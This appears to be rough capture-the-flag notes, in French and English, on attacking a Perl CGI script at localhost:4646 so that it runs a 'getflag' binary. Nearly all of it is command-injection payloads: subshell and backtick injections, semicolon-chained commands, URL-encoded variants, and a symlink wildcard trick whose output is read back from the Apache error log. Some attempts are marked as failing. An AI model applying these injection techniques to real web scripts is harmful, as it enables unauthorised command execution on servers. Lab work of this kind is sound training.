#script perl
curl 'localhost:4646?x=$(getflag)'
> ..

#the script contains a ` ` who a var replacement, we need to exploit this
export VAR='"ca /etc/;getflag > /tmp/file;"'
curl 'localhost:4646?x=$VAR' && echo
cat /tmp/file

#alias
alias GETFLAG=getflag>/tmp/file

#export
export GETFLAG='echo getflag>/tmp/file'
#test with ;
echo ';getflag' > /tmp/xd
perl -- ./level12_test.pl x='%3Bgetflag'

>
Content-type: text/html

x before : [;$getflag]
x after : [;$GETFLAG]
output : [;getflag
]
..%

#try
file%22%3Bgetflag%22

#try ln
ln -s /bin/getflag /tmp/GETFLAG
#ne marche pas
/*/GETFLAG

curl 'localhost:4646?x=`/*/GETFLAG>&2`'
> ne marche pas car les caracteres ne sont pas echappe comme sur les url

curl 'localhost:4646?x=`%2F%2A%2FGETFLAG%3E%262`'

cat /var/log/apache2/error.log
